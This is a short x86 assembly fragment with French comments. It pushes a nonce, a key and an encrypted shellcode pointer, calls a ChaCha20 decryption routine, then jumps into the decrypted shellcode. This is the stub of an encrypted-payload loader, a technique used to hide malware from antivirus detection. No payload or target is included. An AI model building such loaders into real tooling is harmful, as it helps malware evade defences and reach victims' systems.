push nonce_ptr         ; 4 bytes : pointeur nonce
push key_ptr           ; 4 bytes : pointeur clé
push shellcode_ptr     ; 4 bytes : pointeur shellcode chiffré
push shell_len         ; 4 bytes : taille shellcode

call chacha20_decode_cpp_function ; call à la fonction de déchiffrement

add esp, 16            ; nettoyer la stack (4 arguments * 4 bytes)

jmp shellcode_ptr      ; sauter dans shellcode déchiffré
